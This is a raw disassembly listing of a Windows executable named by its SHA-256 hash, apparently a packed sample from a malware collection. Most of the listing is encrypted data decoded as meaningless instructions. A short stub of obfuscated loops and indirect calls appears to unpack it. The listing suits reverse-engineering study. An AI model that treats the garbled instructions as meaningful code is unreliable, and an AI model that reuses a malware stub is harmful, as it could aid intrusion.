
d418f4a1334f571b9065dc83d4061f2823222a0833c1f1da86174df916096477.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a795
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0xf8ed0cf7
  40101f:	retf   
  401020:	cmp    DWORD PTR [eax+0x78],0x78
  401024:	js     0x401024
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080ade
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	fild   DWORD PTR [edx+0x45]
  4010d4:	xchg   ecx,eax
  4010d5:	leave  
  4010d6:	dec    esp
  4010d7:	mov    eax,ds:0xd358af4f
  4010dc:	xor    eax,0x312e47d4
  4010e1:	sbb    DWORD PTR [edi],eax
  4010e3:	jp     0x4010fb
  4010e5:	sbb    edx,DWORD PTR [ebp-0x5592bf5a]
  4010eb:	jbe    0x4010e6
  4010ed:	mov    ds:0x63442ef6,eax
  4010f2:	lahf   
  4010f3:	mov    ds:0xbe2162db,al
  4010f8:	stos   DWORD PTR es:[edi],eax
  4010f9:	adc    esp,esp
  4010fb:	mov    ebp,DWORD PTR [ebx-0x743d5404]
  401101:	mov    esp,0xeac507d8
  401106:	shl    BYTE PTR [edx+0x6b],1
  401109:	pop    edx
  40110a:	jle    0x401141
  40110c:	(bad)  
  40110d:	add    al,0xf7
  40110f:	jae    0x4010b5
  401111:	(bad)  
  401113:	push   ebx
  401114:	xchg   ebp,eax
  401115:	ins    DWORD PTR es:[edi],dx
  401116:	pop    ebx
  401117:	xchg   esi,eax
  401118:	mov    ebx,0xce4057f1
  40111d:	cmp    edi,edx
  40111f:	jb     0x40119b
  401121:	nop
  401122:	add    cl,dl
  401124:	sub    al,0xc8
  401126:	(bad)  
  401127:	(bad)  
  401129:	adc    ah,BYTE PTR ds:0xa35d81fa
  40112f:	pop    esi
  401130:	fisttp WORD PTR [ebx+0x38041738]
  401136:	pop    ds
  401137:	scas   eax,DWORD PTR es:[edi]
  401138:	and    dl,BYTE PTR [edi]
  40113a:	outs   dx,BYTE PTR ds:[esi]
  40113b:	out    dx,eax
  40113c:	add    eax,DWORD PTR [edi]
  40113e:	mov    ebp,0x1bf90912
  401143:	or     DWORD PTR [edi-0x24],0xe45e1fbd
  40114a:	dec    ecx
  40114b:	nop
  40114c:	xor    cl,BYTE PTR [ebp+eax*2-0x67]
  401150:	repz fild QWORD PTR [ebx+0x395c3351]
  401157:	icebp  
  401158:	and    bl,BYTE PTR [eax+0x33]
  40115b:	in     eax,0xcc
  40115d:	lds    ecx,FWORD PTR [ebx]
  40115f:	add    bl,ah
  401161:	fadd   DWORD PTR [ebx+0x2856dcc9]
  401167:	or     ch,BYTE PTR ds:0xf6c2a758
  40116d:	sbb    BYTE PTR [edi-0x4fe96fb8],0x5b
  401174:	cli    
  401175:	cmp    DWORD PTR [ebp+0x71],0x27
  401179:	inc    ebp
  40117a:	shl    esi,1
  40117c:	dec    eax
  40117d:	pop    ds
  40117e:	pop    eax
  40117f:	add    edi,edi
  401181:	imul   ecx,DWORD PTR [eax+0x6],0xdd6fdbc3
  401188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401189:	pop    ebp
  40118a:	rcl    BYTE PTR [ebp+0x7e],0xba
  40118e:	xchg   BYTE PTR [edx-0x22],cl
  401191:	mov    eax,ds:0xc23bca7
  401196:	sahf   
  401197:	inc    edx
  401198:	js     0x401199
  40119a:	stos   DWORD PTR es:[edi],eax
  40119b:	adc    ecx,DWORD PTR [ebx-0x1c]
  40119e:	or     esi,DWORD PTR [esi]
  4011a0:	aam    0xad
  4011a2:	ins    DWORD PTR es:[edi],dx
  4011a3:	add    BYTE PTR [esi+0x2d04c515],bh
  4011a9:	cmp    al,0xd1
  4011ab:	push   ebp
  4011ac:	sbb    dl,BYTE PTR [edx-0x80]
  4011af:	mov    dh,0x17
  4011b1:	loopne 0x401227
  4011b3:	sub    DWORD PTR ds:0xf2c4ff87,esi
  4011b9:	rol    BYTE PTR [eax],cl
  4011bb:	jns    0x40120e
  4011bd:	out    0xe5,eax
  4011bf:	loop   0x401227
  4011c1:	rcr    BYTE PTR [esi+0x2ffc7bc7],cl
  4011c7:	sub    bh,BYTE PTR [esi+0x6d]
  4011ca:	cli    
  4011cb:	sti    
  4011cc:	add    eax,0xbe1e3bad
  4011d1:	or     edi,ebp
  4011d3:	dec    ecx
  4011d4:	and    al,0x5e
  4011d6:	mul    edi
  4011d8:	add    eax,0x20a6788f
  4011dd:	jo     0x4011d6
  4011df:	cwde   
  4011e0:	jge    0x4011fa
  4011e2:	(bad)  
  4011e3:	cmp    eax,0x8165e9f3
  4011e8:	and    BYTE PTR cs:[edx+ecx*2+0x74],0x50
  4011ee:	(bad)  
  4011ef:	fisubr DWORD PTR [edi-0x6c]
  4011f2:	jns    0x401239
  4011f4:	std    
  4011f5:	and    cl,BYTE PTR [esi-0x548a1b4c]
  4011fb:	sub    cl,BYTE PTR [eax+0x19]
  4011fe:	sub    al,0x39
  401200:	mov    esi,0xc6f282b7
  401205:	fucomp st(5)
  401207:	and    eax,0x1d8c5982
  40120c:	jae    0x4011d6
  40120e:	xchg   ebx,eax
  40120f:	cli    
  401210:	push   ss
  401211:	mov    bl,BYTE PTR [eax-0x58]
  401214:	mov    dh,0x64
  401216:	fsub   st(3),st
  401218:	mov    ebx,0x5257a45e
  40121d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40121e:	lods   al,BYTE PTR ds:[esi]
  40121f:	xchg   DWORD PTR [ebx],esi
  401221:	sbb    eax,0x9f0e325a
  401226:	sbb    cl,BYTE PTR [esi+0x7124bcfa]
  40122c:	inc    ebx
  40122d:	ins    BYTE PTR es:[edi],dx
  40122e:	sub    DWORD PTR ds:0x27fdb0a9,ebp
  401234:	gs mov ebx,0x65a44903
  40123a:	pop    esp
  40123b:	dec    esp
  40123c:	jnp    0x4011d3
  40123e:	outs   dx,BYTE PTR ds:[esi]
  40123f:	cs xchg edx,eax
  401241:	lods   al,BYTE PTR ds:[esi]
  401242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401243:	add    esp,DWORD PTR [edx]
  401245:	push   esi
  401246:	les    edx,FWORD PTR [esi]
  401248:	into   
  401249:	xor    dl,al
  40124b:	(bad)  
  40124c:	cwde   
  40124d:	adc    BYTE PTR [ebp+0x11],ah
  401250:	mov    bl,0xcf
  401252:	inc    esi
  401253:	cmp    BYTE PTR [ecx],dh
  401255:	dec    esi
  401256:	cmp    bl,BYTE PTR ds:0x4c867ca3
  40125c:	pushf  
  40125d:	and    DWORD PTR [edx+0x65],edi
  401260:	je     0x401239
  401262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401263:	pop    esi
  401264:	or     ebx,DWORD PTR [edx-0x52]
  401267:	jmp    0x3b79:0x4b444c36
  40126e:	inc    ebx
  40126f:	jecxz  0x40126a
  401271:	mov    al,ds:0x6692273e
  401277:	in     al,0x30
  401279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40127a:	(bad)
  40127d:	lds    ebp,FWORD PTR ds:0x50634b40
  401283:	pop    edi
  401284:	mov    ds:0x9409b45,ax
  40128a:	dec    esi
  40128b:	enter  0xa54d,0xe5
  40128f:	inc    ebx
  401290:	xchg   ebx,eax
  401291:	loope  0x40130e
  401293:	add    eax,0x8234c7fc
  401298:	enter  0x2bb0,0xea
  40129c:	in     eax,dx
  40129d:	mov    edi,0x2211a309
  4012a2:	jne    0x401322
  4012a4:	cdq    
  4012a5:	lock jl 0x40127e
  4012a8:	(bad)  
  4012aa:	mov    eax,ss:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42a82d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7e1
  4012c2:	or     DWORD PTR ds:0x42a78d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a77d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7e1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7d5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a859,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a859
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a859,ebx
  401312:	cmp    DWORD PTR ds:0x42a859,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a859,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a7a1,0x42a825
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a829,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a829
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a829,edi
  401361:	cmp    DWORD PTR ds:0x42a829,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a829,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a829,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a829
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a829,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7d5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a78d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a78d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a78d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7d5
  4013d7:	push   0x0
  4013d9:	push   0x42a9ed
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a78d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a78d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a78d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a78d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a78d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x4f],1
  401422:	jne    0x4013ac
  401424:	ins    BYTE PTR es:[edi],dx
  401425:	(bad)  
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x4013c2
  40142e:	mov    al,0x17
  401430:	and    eax,0xe2f89afb
  401435:	imul   edi,esp,0xfffffff1
  401438:	jnp    0x40148f
  40143a:	sbb    eax,0xba26acb4
  40143f:	in     eax,dx
  401440:	push   edx
  401441:	dec    ebx
  401442:	repnz dec esi
  401444:	jbe    0x401496
  401446:	add    DWORD PTR [eax+edx*2+0x30],ecx
  40144a:	repz mov ch,0x37
  40144d:	or     DWORD PTR [esi+esi*2],edx
  401450:	cmp    eax,0xe52c5f4f
  401455:	or     eax,0xb5a76262
  40145a:	icebp  
  40145b:	cmp    eax,0x1c7ae994
  401460:	sahf   
  401461:	sbb    DWORD PTR [edx],ebx
  401463:	dec    ebp
  401464:	sbb    al,0xc0
  401466:	or     al,0x6c
  401468:	adc    eax,0x10c20c26
  40146d:	cmp    ebx,ebx
  40146f:	iret   
  401470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401471:	test   DWORD PTR [ebx+0x268c2422],esp
  401477:	pop    ebx
  401478:	xor    cl,ah
  40147a:	test   eax,0xc7121254
  40147f:	mov    ecx,0x500b2e7c
  401484:	cmp    BYTE PTR [edx],ch
  401486:	xchg   ebx,eax
  401487:	and    eax,0xb8503bd7
  40148c:	imul   ebx,esi,0xb9b9165f
  401492:	xor    DWORD PTR [edx],esp
  401494:	loopne 0x40145e
  401496:	cmp    ch,BYTE PTR [esi-0xf]
  401499:	ror    BYTE PTR [ebp+0x4a],cl
  40149c:	neg    dh
  40149e:	shl    DWORD PTR [ebx+0x42],cl
  4014a1:	in     al,0x2d
  4014a3:	mov    dh,cl
  4014a5:	pop    eax
  4014a6:	xor    esp,esp
  4014a8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4014aa:	mov    ebx,0x17feefdf
  4014af:	int3   
  4014b0:	mov    esi,0x323c2361
  4014b5:	and    bh,BYTE PTR [edx]
  4014b7:	ret    
  4014b8:	test   ah,ah
  4014ba:	mov    ds:0x369f4b0a,eax
  4014bf:	sbb    DWORD PTR [edx+eax*2],esi
  4014c2:	xchg   esp,eax
  4014c3:	add    al,ah
  4014c5:	inc    eax
  4014c6:	cmp    DWORD PTR [esi-0xd],ecx
  4014c9:	jno    0x401492
  4014cb:	inc    esp
  4014cc:	ret    0xafb
  4014cf:	out    dx,eax
  4014d0:	stos   DWORD PTR es:[edi],eax
  4014d1:	popf   
  4014d2:	push   eax
  4014d3:	sub    dh,BYTE PTR [ecx]
  4014d5:	stc    
  4014d6:	dec    ecx
  4014d7:	dec    ebx
  4014d8:	hlt    
  4014d9:	fist   WORD PTR [ebx+ebp*4+0x7e]
  4014dd:	push   eax
  4014de:	shl    eax,cl
  4014e0:	and    edi,DWORD PTR [edx+0x58]
  4014e3:	(bad)  
  4014e4:	pop    ss
  4014e5:	scas   eax,DWORD PTR es:[edi]
  4014e6:	std    
  4014e7:	cli    
  4014e8:	sub    BYTE PTR [ecx-0x4f],al
  4014eb:	repnz shl BYTE PTR [edx+ecx*1-0x44],1
  4014f0:	mov    ebx,0x8a908da4
  4014f5:	push   ebp
  4014f6:	mov    ch,0xa2
  4014f8:	in     al,dx
  4014f9:	cmp    bl,BYTE PTR [ebx+0x6d]
  4014fc:	pop    ecx
  4014fd:	dec    esp
  4014fe:	pop    ds
  4014ff:	scas   eax,DWORD PTR es:[edi]
  401500:	and    DWORD PTR ss:[ebx-0xe104e99],edi
  401507:	xor    dh,BYTE PTR ds:0x6c50ea22
  40150d:	cmp    bh,bl
  40150f:	fistp  WORD PTR [esi-0x5d746f0d]
  401515:	add    DWORD PTR [edx+0x57],0x22
  401519:	jne    0x401552
  40151b:	mov    BYTE PTR [edi+0x17],bh
  40151e:	enter  0x35b6,0x8
  401522:	in     eax,dx
  401523:	xchg   BYTE PTR [esi-0x2b],bl
  401526:	fisubr DWORD PTR [esi]
  401528:	add    al,0x90
  40152a:	add    BYTE PTR [eax+edi*2],0xc9
  40152e:	xor    DWORD PTR [edi],0x41
  401531:	cmp    eax,0xeb8c7d03
  401536:	xor    BYTE PTR [ecx+0xfd0b992],ch
  40153c:	cmc    
  40153d:	dec    ebx
  40153e:	pop    esi
  40153f:	mov    ecx,0x268a0091
  401544:	jmp    0x1f6cfdc0
  401549:	pushf  
  40154a:	shl    BYTE PTR [esi],1
  40154c:	nop
  40154d:	popa   
  40154e:	sub    ah,BYTE PTR [edi+0x4a]
  401551:	loopne 0x401516
  401553:	sti    
  401554:	aas    
  401555:	imul   ebx,DWORD PTR [ecx+0x6fe2cba1],0x88ba3b03
  40155f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401560:	pop    esp
  401561:	fwait
  401562:	into   
  401563:	vmread DWORD PTR ds:0x4cb8cbc8,edx
  40156a:	popf   
  40156b:	push   esi
  40156c:	pop    ss
  40156d:	mov    ch,0xeb
  40156f:	lea    esi,[bp+si+0x4805]
  401574:	xchg   edi,eax
  401575:	stos   DWORD PTR es:[edi],eax
  401576:	push   ss
  401577:	sar    DWORD PTR [ebx+0x49f457c2],0x44
  40157e:	inc    edx
  40157f:	xchg   esi,eax
  401580:	sbb    DWORD PTR [edx],ebp
  401582:	add    BYTE PTR [esi+0x33],bl
  401585:	mov    esp,edx
  401587:	shl    DWORD PTR [edi-0x68ef18f],1
  40158d:	add    DWORD PTR [ebx],ebx
  40158f:	sti    
  401590:	mov    edx,0xd1fe95f4
  401595:	dec    dx
  401597:	cli    
  401598:	and    DWORD PTR [eax+0x28debf5e],edi
  40159e:	inc    ebx
  40159f:	leave  
  4015a0:	in     eax,0x3f
  4015a2:	mov    esp,0xe452c375
  4015a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015a8:	fdivp  st(7),st
  4015aa:	push   eax
  4015ab:	cmp    eax,0x9bd2309a
  4015b0:	cmp    esi,DWORD PTR [edx+0x272fba06]
  4015b6:	sbb    eax,0xe9deaa78
  4015bb:	pop    ebp
  4015bc:	sbb    al,0x94
  4015be:	jnp    0x4015ad
  4015c0:	add    dl,ah
  4015c2:	dec    esp
  4015c3:	ins    DWORD PTR es:[edi],dx
  4015c4:	mov    eax,0x6c3d6abd
  4015c9:	pop    esi
  4015ca:	(bad)  
  4015cc:	sbb    eax,0x3b89154f
  4015d1:	push   esi
  4015d2:	dec    ebp
  4015d3:	retf   0x9787
  4015d6:	pop    ebp
  4015d7:	cwde   
  4015d8:	mov    esp,0x6018b73d
  4015dd:	xor    eax,DWORD PTR [edx+0x3f352c40]
  4015e3:	lods   al,BYTE PTR ds:[esi]
  4015e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e5:	push   edx
  4015e6:	sub    dl,BYTE PTR [ecx-0x61]
  4015e9:	ja     0x4015e9
  4015eb:	les    ebx,FWORD PTR [ebx]
  4015ed:	(bad)  
  4015ee:	jo     0x4015de
  4015f0:	sub    esi,DWORD PTR [edx+0x36728ac6]
  4015f6:	inc    esp
  4015f7:	inc    ebp
  4015f8:	sbb    BYTE PTR [ebp-0x6b52b3b4],cl
  4015fe:	xchg   edi,eax
  4015ff:	mov    cl,0x9f
  401601:	test   BYTE PTR [edx+0x767c7208],0x36
  401608:	fs cmp bh,0xe1
  40160c:	test   eax,0x86572c7b
  401611:	pop    esi
  401612:	outs   dx,BYTE PTR ds:[esi]
  401613:	into   
  401614:	dec    edx
  401615:	adc    BYTE PTR [ebx-0x5c],bh
  401618:	mov    dl,0xce
  40161a:	aam    0xdd
  40161c:	dec    esi
  40161d:	xor    bh,ah
  40161f:	cmp    esp,DWORD PTR [ebp+0x6ee87b1a]
  401625:	cmp    ebp,DWORD PTR [edi]
  401627:	push   ecx
  401628:	test   al,0xee
  40162a:	push   eax
  40162b:	mov    dl,0x42
  40162d:	sbb    esi,esp
  40162f:	pop    ebx
  401630:	popa   
  401631:	outs   dx,BYTE PTR ds:[esi]
  401632:	jb     0x401659
  401634:	push   0xc90be803
  401639:	xor    DWORD PTR [esi-0x61068dd9],ecx
  40163f:	mul    dh
  401641:	imul   ebx,DWORD PTR [ebp-0x15e0ba16],0xaa335c2c
  40164b:	dec    ebp
  40164c:	ret    0xcc48
  40164f:	(bad)  
  401650:	clc    
  401651:	cmp    eax,0x7813184e
  401656:	cmp    al,0x59
  401658:	cmp    ah,bh
  40165a:	hlt    
  40165b:	and    DWORD PTR [edx-0x189adc1e],ecx
  401661:	ss pop edi
  401663:	xchg   esp,eax
  401664:	jno    0x4016bb
  401666:	and    BYTE PTR [ebx],cl
  401668:	jno    0x40160b
  40166a:	aas    
  40166b:	jo     0x4016a7
  40166d:	jle    0x40164b
  40166f:	push   edx
  401670:	adc    al,BYTE PTR ds:0xe36c1105
  401676:	dec    ebp
  401677:	ja     0x40163e
  401679:	mov    esi,0x60817308
  40167e:	xor    ah,BYTE PTR [ecx-0x671b7c51]
  401684:	fwait
  401685:	adc    ebp,DWORD PTR [ecx]
  401687:	in     eax,0x3a
  401689:	sbb    ebp,DWORD PTR [esi+0x3e6ea3bc]
  40168f:	aaa    
  401690:	mov    ebx,0xf37a2fc2
  401695:	jle    0x401675
  401697:	push   ax
  401699:	mov    bl,0x4c
  40169b:	xor    eax,0xd6cf6cbb
  4016a0:	mov    al,ds:0xdaa6226d
  4016a5:	rcr    edi,1
  4016a7:	clc    
  4016a8:	das    
  4016a9:	jo     0x401660
  4016ab:	cld    
  4016ac:	sub    ebp,edx
  4016ae:	jl     0x4016b3
  4016b0:	mov    DWORD PTR [ecx+0x42a86d35],0x53dc00
  4016ba:	add    BYTE PTR [ecx-0x26c2eeff],cl
  4016c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c1:	inc    edx
  4016c2:	add    BYTE PTR [ebp+0xd81fc45],cl
  4016c8:	mov    DWORD PTR [edi-0x5882ffbe],esp
  4016ce:	inc    edx
  4016cf:	add    BYTE PTR [ecx+0x1d31f045],cl
  4016d5:	lea    esp,[edi+0x458b0042]
  4016db:	or     bh,dh
  4016dd:	(bad)  [ebx-0x39cc0fb3]
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz jnp 0x40173c
  4016f6:	jnp    0x401765
  4016f8:	jl     0x4016fd
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x401741
  401701:	sub    eax,0x48638e25
  401706:	data16 ins BYTE PTR es:[edi],dx
  401708:	push   ebp
  401709:	stos   BYTE PTR es:[edi],al
  40170a:	retf   
  40170b:	daa    
  40170c:	jge    0x401778
  40170e:	in     eax,0xfa
  401710:	shl    BYTE PTR es:[ecx],1
  401713:	sbb    ah,BYTE PTR cs:[edx+ebp*1-0x23]
  401718:	add    al,0xd
  40171a:	sub    BYTE PTR [eax],dl
  40171c:	xlat   BYTE PTR ds:[ebx]
  40171d:	cmp    eax,0x53d175b
  401722:	cmp    cl,ah
  401724:	in     al,0xec
  401726:	(bad)  
  401727:	lods   al,BYTE PTR ds:[esi]
  401728:	(bad)  
  401729:	fbstp  TBYTE PTR [edi-0x14f04479]
  40172f:	inc    edx
  401730:	shl    BYTE PTR [esi],1
  401732:	lods   eax,DWORD PTR ds:[esi]
  401733:	sbb    BYTE PTR [ecx-0x61],dl
  401736:	jecxz  0x4016f7
  401738:	stos   BYTE PTR es:[edi],al
  401739:	ins    WORD PTR es:[edi],dx
  40173b:	mov    eax,DWORD PTR [eax-0x29]
  40173e:	js     0x40171a
  401740:	push   esp
  401741:	mov    es,WORD PTR [esi+0x4da17f19]
  401747:	mov    eax,0xb9a79102
  40174c:	aas    
  40174d:	hlt    
  40174e:	cli    
  40174f:	aam    0x93
  401751:	push   ss
  401752:	stos   DWORD PTR es:[edi],eax
  401753:	sub    ecx,esp
  401755:	jno    0x401763
  401757:	out    0xb9,eax
  401759:	repz pop ebp
  40175b:	rcr    BYTE PTR [ecx+edx*4+0x1ec90983],0xa6
  401763:	sbb    DWORD PTR [ecx+0x48cb8378],ebx
  401769:	pusha  
  40176a:	adc    ah,BYTE PTR [ebp-0x15]
  40176d:	sbb    al,0x10
  40176f:	xor    al,bh
  401771:	inc    ebx
  401772:	mov    ch,0xc5
  401774:	pop    es
  401775:	dec    esp
  401776:	dec    esi
  401777:	push   edi
  401778:	aam    0x70
  40177a:	je     0x40176c
  40177c:	mov    eax,0xc6e38561
  401781:	mov    edx,0xbc87395f
  401786:	adc    eax,0x4e037383
  40178b:	shld   DWORD PTR [eax-0xd5fc63a],ecx,cl
  401792:	(bad)  
  401793:	xor    eax,0xb170f30
  401798:	(bad)  
  401799:	aad    0x1b
  40179b:	xchg   DWORD PTR [ebp+0x77077953],edi
  4017a1:	jbe    0x40181e
  4017a3:	sub    edx,eax
  4017a5:	jo     0x401780
  4017a7:	adc    DWORD PTR [esi+0x7],0xfffffff9
  4017ab:	mov    ebp,0xb920f839
  4017b0:	loope  0x4017d4
  4017b2:	fs or  al,0x0
  4017b5:	inc    edi
  4017b6:	shl    DWORD PTR [edx+0x27],1
  4017b9:	dec    ebp
  4017ba:	js     0x4017e9
  4017bc:	pop    ebp
  4017bd:	mov    DWORD PTR [eax-0x37],ebx
  4017c0:	outs   dx,BYTE PTR ds:[esi]
  4017c1:	adc    eax,0x4fe5730a
  4017c6:	enter  0xaf73,0xf9
  4017ca:	pop    ecx
  4017cb:	(bad)  
  4017cc:	clc    
  4017cd:	mov    ?,WORD PTR [edx+0x52]
  4017d0:	jge    0x401848
  4017d2:	repz adc edx,esp
  4017d5:	ret    0xcb7d
  4017d8:	enter  0xdde1,0x41
  4017dc:	pop    ebx
  4017dd:	jecxz  0x401843
  4017df:	inc    edx
  4017e0:	fsubrp st(7),st
  4017e2:	out    dx,al
  4017e3:	lahf   
  4017e4:	into   
  4017e5:	push   esi
  4017e6:	out    0x44,al
  4017e8:	rol    BYTE PTR ds:0x53e8ffea,1
  4017ee:	fdiv   st(7),st
  4017f0:	jl     0x40183d
  4017f2:	lds    esi,FWORD PTR [ebx+0x12]
  4017f5:	mov    edx,0xa5ef470a
  4017fa:	cmp    ah,BYTE PTR [edx+0x11a9d554]
  401800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401801:	ja     0x4017ce
  401803:	adc    eax,0x420ff0db
  401808:	push   eax
  401809:	rol    al,cl
  40180b:	add    BYTE PTR [ebx+0x7b],ah
  40180e:	add    ah,BYTE PTR [edi+0x6846fa97]
  401814:	jbe    0x4017f7
  401816:	dec    esp
  401817:	xor    DWORD PTR ss:[ecx+0x2e93bd8a],0xbdbd5009
  401822:	pop    esp
  401823:	xchg   esi,eax
  401824:	xor    eax,0xf4b3e7c5
  401829:	and    bl,BYTE PTR [ecx+0x211d54c1]
  40182f:	xor    eax,0x9afbae0c
  401834:	pushf  
  401835:	jno    0x401897
  401837:	scas   eax,DWORD PTR es:[edi]
  401838:	push   esi
  401839:	lods   eax,DWORD PTR ds:[esi]
  40183a:	(bad)  
  40183b:	int    0x5f
  40183d:	mov    edi,0x1e8c9a4d
  401842:	cmp    esi,edx
  401844:	pop    es
  401845:	leave  
  401846:	pop    es
  401847:	(bad)  
  401848:	clc    
  401849:	jns    0x4018bc
  40184b:	dec    esp
  40184c:	into   
  40184d:	add    eax,0x93de6b6c
  401852:	in     al,dx
  401853:	fsub   st(3),st
  401855:	fild   WORD PTR [ebp+0x3a]
  401858:	enter  0x9c34,0xe2
  40185c:	mov    dl,0x12
  40185e:	mov    al,ds:0x1cf383d4
  401863:	sbb    eax,0x392e1ca7
  401868:	fisub  DWORD PTR [edx]
  40186a:	lds    edi,FWORD PTR [edx+0x67cd08fa]
  401870:	push   esp
  401871:	inc    esp
  401872:	jmp    0x401847
  401874:	push   edx
  401875:	mov    ds:0xb27b3c48,eax
